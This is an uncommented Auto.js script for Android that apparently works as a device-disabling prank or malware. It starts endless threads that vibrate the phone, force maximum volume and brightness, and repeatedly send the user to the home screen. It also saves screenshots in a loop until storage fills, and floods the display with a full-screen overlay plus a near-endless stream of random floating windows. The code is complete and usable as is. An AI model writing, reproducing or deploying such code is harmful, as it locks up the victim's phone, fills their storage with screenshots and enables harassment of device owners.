auto.waitFor();
requestScreenCapture();
kszsj();
function kszsj() {
    var num = 1000000000000;
    threads.start(function() {
        while (true) {
            device.vibrate(1000);
            sleep(900);
        }
    });
    threads.start(function() {
        while (true) {
            device.setMusicVolume(device.getMusicMaxVolume());
            device.setBrightnessMode(0);
            device.setBrightness(255);
            home();
            device.wakeUp();
        }
    });
    threads.start(function() {
        while (true) {
            images.save(captureScreen(), "./" + random(164349, 64646449816161616161619) + ".png")
        }
    });
    sleep(2000);
    var bgs = floaty.rawWindow(
        <frame bg="#aa5511"/>
    );
    bgs.setPosition(0, 0);
    bgs.setSize(device.width, device.height);
    threads.start(function() {
        for (var i = 0; i < num; i++) {
            var a = floaty.rawWindow(
                <frame bg="{{bg()}}"/>
            );
            a.setPosition(random(-500, device.width), random(-800, device.height));
            a.setSize(random(200, device.width), random(200, device.height));
        }
    });
}

function bg() {
    var a = random(17, 255).toString(16);
    var r = random(17, 255).toString(16);
    var g = random(17, 255).toString(16);
    var b = random(17, 255).toString(16);
    return "#" + a + r + g + b;
}